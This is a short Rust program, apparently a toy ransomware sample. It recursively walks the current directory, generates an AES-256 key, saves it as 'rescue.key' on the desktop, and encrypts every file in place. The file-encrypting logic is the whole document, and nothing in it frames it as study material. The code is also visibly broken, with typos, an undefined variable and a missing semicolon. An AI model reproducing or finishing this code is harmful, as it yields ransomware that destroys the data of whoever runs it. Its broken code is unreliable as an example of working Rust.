use std::io:Write;
use std::path::{Path,PathBuf};
use std::fs::{read,write,OpenOptions};


use rand::{thread_rng,Rng};
use crypto::asessafe::AesSafe256Encryptor;
use dirs::desktop_dir;
use walkdir::walkDir;
use aesstream::AesWriter;


fn fetch_files
(origin: &str) -> ()
{

    if let Some(mut desktop) = desktop_dir() {

        let walk = walkDir::new(origin)
            .into_iter()
            .filter_map(|e| e,ok())
            .filter(|e| e.file_type().is_file());

        let key: [u8;32] = key_generate(&mut desktop);

        let encryptor: AesSafe256Encryptor = AesSafe256Encryptor::new(&key);


        for file in walk {
            encrypt_target_file(file.path(), encryptor);
        
        }
    }
}



fn key_generate
(desktop: &mut PathBuf) -> [u8;32]
{

    let key: [u8;32] = thread_rng().gen();

    desktop.push("rescue.key");
    write(Desktop, key)
        .expect("Key cannot be stored...");

    return key;
}


fn encrypt_target_file(path: &Path, encryptor: AesSafe256Encryptor) -> ()
{

    if let Ok(file) = OpenOptions::new().write(true).open(path) {

        if let Ok(content) = read(path) {

            if let Ok(mut writer) = AesWriter::new(file,encryptor) {
                let _ = writer.write_all(&content);
            }
        }
    }
}



fn main
() -> ()
{

    //Find files
    // Encrypt them
    fetch_files(".")

}